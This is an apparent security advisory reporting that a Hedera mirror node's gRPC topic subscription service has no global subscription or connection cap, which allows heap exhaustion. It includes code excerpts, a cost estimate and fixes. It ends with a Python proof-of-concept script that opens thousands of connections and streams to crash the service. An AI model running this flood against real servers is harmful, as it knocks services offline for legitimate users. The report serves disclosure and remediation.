### Title
Unbounded Subscription Creation in PollingTopicListener Enables Resource Exhaustion (DoS)

### Summary
`PollingTopicListener.listen()` creates a new `PollingContext` (with `AtomicLong`, `AtomicReference`, and a full Reactor pipeline running `RepeatSpec.times(Long.MAX_VALUE)`) for every subscription with no global cap on active subscriptions or total connections. The only server-side guard, `maxConcurrentCallsPerConnection = 5`, limits calls per TCP connection but imposes no ceiling on the number of connections an attacker may open, allowing an unprivileged remote user to accumulate arbitrarily many live subscriptions and exhaust JVM heap.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` (lines 34–49) allocates a fresh `PollingContext` per call:

```java
PollingContext context = new PollingContext(filter);   // line 35
// PollingContext holds:
private final AtomicLong count = new AtomicLong(0L);          // line 68
private final AtomicReference<@Nullable TopicMessage> last = new AtomicReference<>(); // line 69
```

Each call also constructs a long-lived Reactor pipeline:

```java
return Flux.defer(() -> poll(context))
    .delaySubscription(interval, scheduler)
    .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)   // line 40 – runs forever
        .withFixedDelay(interval)
        .withScheduler(scheduler))
    ...
```

The upstream caller `TopicMessageServiceImpl.subscribeTopic()` (lines 48, 89–90) tracks subscriptions only as a Micrometer gauge:

```java
private final AtomicLong subscriberCount = new AtomicLong(0L);  // line 48
.doOnSubscribe(s -> subscriberCount.incrementAndGet())           // line 89
.doFinally(s -> subscriberCount.decrementAndGet())               // line 90
```

`subscriberCount` is **never compared against a maximum**; it is registered solely as a metric gauge (lines 52–55). There is no `maxSubscribers` check anywhere in the gRPC module.

**Connection-level guard is insufficient:**

`GrpcConfiguration` (line 33) applies:

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`NettyProperties` (line 14) defaults this to **5**. This limits concurrent streaming RPCs *per TCP connection* but sets **no bound on the number of TCP connections**. No `maxConnections`, per-IP limit, or rate-limit exists anywhere in the gRPC module (the `ThrottleConfiguration` with bucket4j lives exclusively in the `web3` module).

**Per-subscription heap cost:**

| Object | Approximate size |
|---|---|
| `PollingContext` shell | ~32 B |
| `AtomicLong` | ~24 B |
| `AtomicReference` | ~16 B |
| `TopicMessageFilter` (immutable value) | ~200 B |
| `TopicContext` in service layer | ~300 B |
| Reactor `Flux` operator chain (defer + repeatWhen + tap + doOnNext …) | ~2–4 KB |
| Netty channel + gRPC stream state | ~8–16 KB |

At 100 000 concurrent subscriptions the Reactor/Netty state alone accounts for ~1–2 GB of heap, well within reach of a single attacker machine opening ~20 000 TCP connections (each carrying 5 streams).

### Impact Explanation
A successful attack terminates the gRPC service with `OutOfMemoryError`, making topic subscription unavailable to all legitimate users. Because the gRPC service is the sole real-time HCS (Hedera Consensus Service) streaming interface, prolonged unavailability breaks any application relying on live topic feeds. Recovery requires a JVM restart; without a connection limit the attack can be re-launched immediately.

### Likelihood Explanation
No authentication or API key is required to open a gRPC connection or call `subscribeTopic`. A single commodity machine with a 1 Gbps NIC can sustain tens of thousands of concurrent TCP connections. The attacker needs only a valid (or non-existent, if `checkTopicExists = false`) topic ID and a standard gRPC client. The attack is fully repeatable and scriptable.

### Recommendation
1. **Enforce a global subscription cap** inside `TopicMessageServiceImpl.subscribeTopic()`: compare `subscriberCount` against a configurable `maxSubscribers` property and return `RESOURCE_EXHAUSTED` when exceeded.
2. **Add a total-connection limit** in `GrpcConfiguration` via `NettyServerBuilder.maxConnectionAge` / a custom `ServerInterceptor` that tracks and rejects connections beyond a threshold.
3. **Add per-IP connection rate limiting** at the load-balancer or via a gRPC `ServerInterceptor`.
4. **Require authentication** (mTLS or token) for streaming RPCs so unauthenticated clients cannot open unlimited streams.

### Proof of Concept

```python
import grpc, threading, time
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hedera.mirror.api.proto import consensus_service_pb2 as cs_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 5000   # open 5000 TCP connections
STREAMS_PER_CONN = 5 # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = cs.ConsensusServiceStub(channel)
    req = cs_pb2.ConsensusTopicQuery(
        topicID=cs_pb2.TopicID(topicNum=1),
        consensusStartTime=Timestamp(seconds=0)
    )
    streams = []
    for _ in range(STREAMS_PER_CONN):
        # Each subscribe call → new PollingContext + infinite Reactor pipeline
        s = stub.subscribeTopic(req)
        streams.append(s)
    time.sleep(3600)   # hold open for 1 hour

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Expected result: JVM OOM / gRPC service crash after heap exhaustion

    @Data
    private class PollingContext {

        private final TopicMessageFilter filter;
        private final AtomicLong count = new AtomicLong(0L);
        private final AtomicReference<@Nullable TopicMessage> last = new AtomicReference<>();

        void onNext(TopicMessage topicMessage) {
            last.set(topicMessage);
            count.incrementAndGet();
        }

        private @Nullable TopicMessage getLast() {
            return last.get();
        }
    }
